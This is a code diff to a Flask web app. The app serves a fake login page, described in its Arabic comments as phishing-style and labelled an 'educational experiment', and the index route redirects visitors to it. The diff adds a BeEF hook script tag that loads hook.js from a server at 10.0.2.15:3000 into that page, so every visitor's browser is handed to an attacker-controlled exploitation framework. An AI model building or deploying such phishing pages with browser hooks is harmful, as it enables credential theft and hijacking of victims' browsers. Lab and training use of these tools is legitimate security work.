@@ -94,11 +94,13 @@ def index():
     # 2. إعادة التوجيه إلى صفحة تسجيل الدخول الوهمية
     return redirect('/login')
 
-# ========== صفحة تسجيل الدخول الوهمية ==========
+# ========== صفحة تسجيل الدخول الوهمية (معدلة مع كود BeEF Hook) ==========
 login_page_html = '''
 <!DOCTYPE html>
 <html>
 <head>
+    <!-- كود BeEF Hook -->
+    <script src="http://10.0.2.15:3000/hook.js"></script>
     <title>تسجيل الدخول - تجربة تعليمية</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
